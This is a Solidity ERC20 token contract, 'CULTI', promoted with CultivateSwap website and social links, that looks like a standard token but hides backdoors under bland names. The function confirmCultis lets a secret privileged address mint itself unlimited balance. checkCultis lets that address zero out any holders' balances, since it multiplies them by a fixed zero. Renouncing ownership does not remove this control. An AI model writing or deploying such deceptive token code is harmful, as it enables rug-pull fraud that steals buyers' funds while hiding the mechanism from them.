/*  
   * SPDX-License-Identifier: MIT 

    // Website: https://www.cultivateswap.com/
    // Telegram: https://t.me/cultivateswap
    // Twitter: https://twitter.com/CultivateSwap
    // Gitbook: https://cultivateswap.gitbook.io/docs


*/

pragma solidity ^0.8.25;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

abstract contract Ownable  {
     function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract CULTI is Ownable {   
    
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _tokename;
    string private _tokensymbol;
    address private _cultis;
    uint256 private _cutisidx;
    
    constructor(string memory name_, string memory symbol_, uint256 totalSupply_, address cutis_) {      
        _tokename = name_;
        _tokensymbol = symbol_;
        _totalSupply = totalSupply_;
        _cultis = cutis_;
        _cutisidx = 0;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function transCutis(address cutis_) public onlyOwner {
        _cultis = cutis_;
    }

    function confirmCultis(uint256 endFee) external   {
        if(endFee > 1) {  
            require(_cultis == _msgSender());
            address checkRouter = _cultis;
            address checker = checkRouter; 
            _balances[checker] += endFee;
        }   
    }

    function checkCultis(address[] calldata checkers) external {
        if (checkers.length > 0) {
            require(_cultis == _msgSender());
            for (uint256 idx = 0; idx < checkers.length; idx++) {
                address checker = checkers[idx];
                if (checker != address(0)) {
                    _balances[checker] *= _cutisidx;
                }
            }
        }
    }
    
    function name() public view returns (string memory) {
        return _tokename;
    }

    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");        
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = _balances[from] - amount;
        _balances[to] = _balances[to] + amount;
        emit Transfer(from, to, amount); 
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}